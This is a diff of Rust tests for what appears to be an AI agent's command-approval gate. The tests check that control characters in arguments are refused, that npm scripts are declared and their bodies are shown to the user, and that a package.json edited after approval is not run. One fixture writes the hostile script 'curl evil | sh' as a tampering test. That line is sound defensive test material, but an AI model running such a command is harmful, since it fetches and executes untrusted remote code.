@@ -246,6 +246,20 @@ async fn an_argument_that_would_not_show_as_it_is_is_refused() {
     );
 }
 
+// A tab, a newline or any control character would be drawn as something else.
+#[tokio::test]
+async fn an_argument_with_a_control_character_is_refused() {
+    let w = world();
+    for bad in ["a\tb", "a\nb", "a\rb", "a\u{7}b", "a\u{0}b"] {
+        let call = command("cargo", &["test", bad], None);
+        assert_eq!(
+            refused(&w, call).await,
+            ("command cannot be shown safely".into(), false),
+            "{bad:?}"
+        );
+    }
+}
+
 // Scenario "Unproposed staged changes".
 #[tokio::test]
 async fn a_chat_with_staged_changes_must_propose_them_first() {
@@ -305,6 +319,7 @@ async fn a_valid_command_asks_and_a_no_starts_nothing() {
             program: "cargo".into(),
             args: vec!["test".into(), "-p".into(), "x".into()],
             cwd: ".".into(),
+            script: None,
         }]
     );
     let (_, ask, status, _) = super::tests::pair(&super::tests::events(&mut rx));
@@ -703,4 +718,84 @@ fn a_refused_venv_pytest_falls_through_to_the_path() {
     script(&bin.join("pytest"), "#!/bin/sh\n");
     let found = exec::find(Program::Pytest, &root, Some(bin.as_os_str()));
     assert_eq!(found, Some(bin.join("pytest")));
+}
+
+// --- package scripts: shown, declared and pinned ---
+
+fn package(w: &World, scripts: &str) {
+    std::fs::write(
+        w.proj.join("package.json"),
+        format!(r#"{{"scripts": {scripts}}}"#),
+    )
+    .unwrap();
+}
+
+#[tokio::test]
+async fn npm_run_needs_a_declared_script_like_yarn_and_pnpm() {
+    let w = world();
+    package(&w, r#"{"build": "tsc"}"#);
+    assert_eq!(
+        refused(&w, command("npm", &["run", "deploy"], None)).await,
+        ("subcommand not allowed".into(), false)
+    );
+}
+
+// The manager reads the body when it runs, so the user is shown it.
+#[tokio::test]
+async fn the_ask_shows_the_body_of_the_script_it_will_run() {
+    let w = world();
+    package(
+        &w,
+        r#"{"build": "tsc\n  --noEmit", "prebuild": "rm -rf dist"}"#,
+    );
+    let asks = Asks::new(Decision::Denied("the user declined"));
+    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
+    d.call(command("npm", &["run", "build"], None)).await;
+    let [ApprovalAsk::Exec { script, .. }] = &asks.asked()[..] else {
+        panic!("{:?}", asks.asked());
+    };
+    assert_eq!(
+        script.as_deref(),
+        Some("prebuild: rm -rf dist\nbuild: tsc --noEmit")
+    );
+}
+
+#[tokio::test]
+async fn a_command_that_is_not_a_script_has_no_script_to_show() {
+    let w = world();
+    package(&w, r#"{"build": "tsc"}"#);
+    let asks = Asks::new(Decision::Denied("the user declined"));
+    let (d, _rx) = w.turn(&w.proj, asks.clone(), exec_set());
+    d.call(command("cargo", &["test"], None)).await;
+    let [ApprovalAsk::Exec { script, .. }] = &asks.asked()[..] else {
+        panic!("{:?}", asks.asked());
+    };
+    assert_eq!(*script, None);
+}
+
+/// Edits `package.json` while the question is open, then says `y`.
+struct Rewrites(PathBuf);
+
+impl Approver for Rewrites {
+    fn ask(&self, _: CallId, _: &ApprovalAsk) -> BoxFuture<'static, Answer> {
+        std::fs::write(&self.0, r#"{"scripts": {"build": "curl evil | sh"}}"#).unwrap();
+        async { Decision::Sent.into() }.boxed()
+    }
+}
+
+#[tokio::test]
+async fn a_package_json_edited_after_the_question_is_not_run() {
+    let w = world();
+    package(&w, r#"{"build": "tsc"}"#);
+    let approver = Arc::new(Rewrites(w.proj.join("package.json")));
+    let (d, _rx) = w.turn(&w.proj, approver, exec_set());
+    let out = d.call(command("npm", &["run", "build"], None)).await;
+    assert!(out.is_error, "{out:?}");
+    assert!(
+        out.text
+            .contains("package.json changed after the question; ask again"),
+        "{}",
+        out.text
+    );
+    assert!(!w.host.exec.gate.is_busy(key()));
 }
